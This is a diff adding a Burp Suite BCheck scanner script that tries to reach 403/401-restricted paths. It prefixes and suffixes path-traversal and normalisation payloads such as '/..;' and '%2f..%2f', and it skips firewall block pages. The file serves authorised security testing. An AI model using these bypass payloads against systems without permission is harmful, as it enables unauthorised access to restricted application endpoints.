@@ -1,0 +1,80 @@
+#Test different types of techniques to access restricted endpoints.
+#Verified: Yes
+
+metadata:
+    language: v1-beta
+    name: "Path-bypass"
+    description: "Trying out techniques to bypass a restricted path discovered in the application. Except firewall 403 respones to avoid a lot of junk traffic."
+    tags: "active", "bypass", "path", "forbidden", "403"
+    author: "Brumens"
+
+define:
+    desc = "Possible that a bypass technique worked and that we accessed a restricted path in the application"
+    reme = "Manual testing is required to confirm the issue"
+    trackHeader = "X-BCheck"
+    trackValue = "path-bypass"
+
+run for each:
+    payload =
+        "/",
+        "//",
+        "/..;",
+        "/..",
+        "%2f..%2f",
+        "/notfound/%2f..%2f../",
+        "/;",
+        "/.",
+        "__EXT_PAYLOAD__.json",
+        "__EXT_PAYLOAD__.html",
+        "__FULL_URL__"
+
+given request then
+    #Check if we triggered a 403/401 path that isen't a response from a firewall (Akamai, CloudFlare, CloudFront and pattern detection)
+    if {latest.response.status_code} matches "40(3|1)" and not( ("What happened?" in {latest.response.body} and "security" in {latest.response.body}) or "Ray ID:" in {latest.response.body} or "CloudFront" in {latest.response.body} ) then
+
+        if {payload} is "/" then
+            send request:
+            method: "GET"
+            path: {latest.request.url.path}
+            replacing headers: `{trackHeader}`:`{trackValue}`
+
+        #Extension bypass technique:
+        else if "__EXT_PAYLOAD__" in {payload} then
+
+        #Check if the path end with a forward slash:
+        if {latest.request.url.path} matches "^.*\/$" then
+            send request:
+                method: "GET"
+                path: `{regex_replace({latest.response.url.path}, "\/$", {regex_replace({payload}, "__EXT_PAYLOAD__", "")})}`
+                replacing headers: `{trackHeader}`:`{trackValue}`
+        else then
+            send request:
+                method: "GET"
+                path: `{latest.response.url.path}{regex_replace({payload}, "__EXT_PAYLOAD__", "")}`
+                replacing headers: `{trackHeader}`:`{trackValue}`
+        end if
+
+        #Use full URL in path technique:
+        else if "__FULL_URL__" in {payload} then
+            send request:
+		method: "GET"
+		path: `{latest.request.url}`
+                replacing headers: `{trackHeader}`:`{trackValue}`
+
+        #Prefix payload bypass technique:
+        else then
+            send request:
+                method: "GET"
+                path: `{payload}{latest.response.url.path}`
+                replacing headers: `{trackHeader}`:`{trackValue}`
+        end if
+
+        #Check if any technique was capable of bypassing the restricted endpoint:
+        if not( {latest.response.status_code} matches "(40[0134]|503)" ) and not( {payload} is "/" ) then
+            report issue:
+            severity: high
+            confidence: tentative
+            detail: {desc}
+            remediation: {reme}
+        end if
+    end if
